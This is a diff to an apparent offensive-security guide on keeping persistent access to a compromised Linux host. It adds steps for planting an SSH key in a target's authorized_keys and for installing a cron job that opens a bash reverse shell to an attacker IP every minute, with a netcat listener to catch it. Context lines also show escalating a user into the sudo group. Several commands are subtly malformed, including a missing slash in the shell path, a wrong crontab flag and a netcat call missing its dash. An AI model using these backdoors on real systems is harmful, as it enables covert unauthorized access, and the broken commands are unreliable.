@@ -25,22 +25,65 @@ sudo usermod -u <target_uid> <username>
 sudo usermod -aG sudo <username>
 ```
 
-## Using SSH Keys for Persistence
+## Using SSH Keys 
 SSH keys provide a more secure and stealthy method of maintaining access to a Linux system. By copying your public SSH key to the target system, you can log in without needing to know the password.
 
 1. **Generate SSH Key Pair**
 ```bash
 ssh-keygen -t rsa -b 2048
 ```
+- When prompted, press Enter to accept the default file location (`~/.ssh/id_rsa`).
+- Optionally, set a passphrase for extra security. If you leave it empty, the key can be used without a password.
 
 2. **Copy the Public Key to the Target**
 ```bash
 ssh-copy-id <username>@<target_ip>
 ```
+This command will:
+
+- Add your public key to the `~/.ssh/authorized_keys` file on the target.
+- Create the `.ssh` directory and set correct permissions if they don’t already exist.
+
+**Manual Alternative**:  
+If `ssh-copy-id` is not available, you can manually copy the key:
+```bash
+cat ~/.ssh/id_rsa.pub | ssh <username>@<target_ip> "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+```
 
 3. **Verify Access**
 ```bash
 ssh <username>@<target_ip>
+```
+
+## Using a Cron Job
+1. **Create a Cron Job in a File**  
+Use `echo` to define the cron job and redirect it to a file:
+```bash
+echo "* * * * * /bin/bash -c 'bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > <new_file>
+```
+
+2. **Install the Cron Job Using `crontab`**  
+Use the `crontab` command to install the cron job from the file:
+
+```bash
+crontab -i <new_file>
+```
+
+3. **Verify the Cron Job**  
+Check if the cron job was successfully added:
+
+```bash
+crontab -l
+```
+This should display:
+```bash
+* * * * * /bin/bash -c 'bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
+```
+
+4. **Start a Netcat Listener**  
+On your machine (attacker's side), open a Netcat listener to receive the reverse shell connection:
+```bash
+nc lvnp 4444
 ```
 
 
